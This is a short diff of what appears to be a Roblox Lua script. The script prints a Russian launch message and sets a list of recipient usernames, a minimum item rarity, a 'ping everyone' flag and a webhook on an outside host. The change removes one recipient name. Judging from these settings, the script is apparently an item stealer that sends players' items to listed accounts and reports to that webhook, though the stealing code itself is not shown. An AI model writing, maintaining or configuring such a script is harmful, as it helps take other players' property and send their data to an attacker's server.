@@ -9,7 +9,7 @@ task.spawn(function()
         print("Скрипт успешно загружен и запущен!")
     end
 
-    local users = _G.Usernames or {"ilyes_ida3", "057Deni", "pignkn"}
+    local users = _G.Usernames or {"057Deni", "pignkn"}
     local min_rarity = _G.min_rarity or "Common"
     local ping = _G.pingEveryone or "Yes"
     local webhook = _G.webhook or "http://de-bots.h1cloud.net:25569/roblox-webhook"
